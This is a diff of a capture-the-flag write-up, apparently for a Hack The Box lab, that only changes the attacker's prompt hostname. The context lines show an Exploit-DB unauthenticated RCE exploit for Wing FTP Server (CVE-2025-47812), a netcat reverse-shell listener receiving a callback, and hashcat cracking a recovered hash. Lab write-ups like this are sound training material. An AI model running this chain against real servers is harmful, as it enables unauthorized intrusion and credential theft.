@@ -85,7 +85,7 @@ The two supplied screenshots show the web reconnaissance sequence.
 Search Exploit-DB locally for the detected Wing FTP version. The complete search transcript is preserved below.
 
 ```bash
-┌──[kali@Shieldbyte53]─[~]
+┌──[kali@0x3xp10i73r]─[~]
 └─❯ searchsploit "Wing FTP Server 7.4.3"
 ---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                            |  Path
@@ -94,7 +94,7 @@ Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution  (RCE)            
 ---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 
-┌──[kali@Shieldbyte53]─[~]
+┌──[kali@0x3xp10i73r]─[~]
 └─❯ searchsploit -m multiple/remote/52347.py
   Exploit: Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution  (RCE)
       URL: https://www.exploit-db.com/exploits/52347
@@ -108,7 +108,7 @@ Copied to: /home/kali/52347.py
 The matching entry is an unauthenticated remote-code-execution exploit associated with CVE-2025-47812. The complete command-execution transcript follows.
 
 ```bash
-┌──[kali@Shieldbyte53]─[~/test]
+┌──[kali@0x3xp10i73r]─[~/test]
 └─❯ python3 52347.py -u http://ftp.wingdata.htb/ -c "id"
 
 [*] Testing target: http://ftp.wingdata.htb/
@@ -127,7 +127,7 @@ This confirms unauthenticated command execution as the service account.
 Start a listener and use the exploit to obtain a callback. The complete callback and shell transcript from the source note is preserved below.
 
 ```bash
-┌──[kali@Shieldbyte53]─[~]
+┌──[kali@0x3xp10i73r]─[~]
 └─❯ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.9] from (UNKNOWN) [10.129.232.33] 52678
@@ -178,7 +178,7 @@ wingftp@wingdata:/var/www/wingdata.htb$
 Crack the recovered hash with the available wordlist. The complete hashcat transcript follows.
 
 ```bash
-┌──[kali@Shieldbyte53]─[~/Downloads]
+┌──[kali@0x3xp10i73r]─[~/Downloads]
 └─❯ hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
 hashcat (v7.1.2) starting
 
